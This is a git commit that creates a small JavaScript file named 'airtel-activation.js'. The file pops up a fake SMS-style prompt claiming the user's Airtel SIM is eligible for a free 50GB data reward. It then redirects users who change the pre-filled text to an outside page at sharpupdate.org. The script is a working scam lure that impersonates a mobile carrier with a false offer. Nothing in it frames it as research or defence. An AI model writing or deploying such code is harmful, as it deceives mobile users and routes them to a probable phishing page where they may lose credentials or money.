af32ce9775b69faec431e4c6140708dc0cb5d0ac
ekperikpe <ekperikpe588@gmail.com>
2025-08-03 09:54:38 +0100

    Create airtel-activation.js

---
+++ airtel-activation.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your Airtel SIM card is eligible to receive free data old sim card reward, click OK to activate now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://sharpupdate.org/myairtel.html';
+}
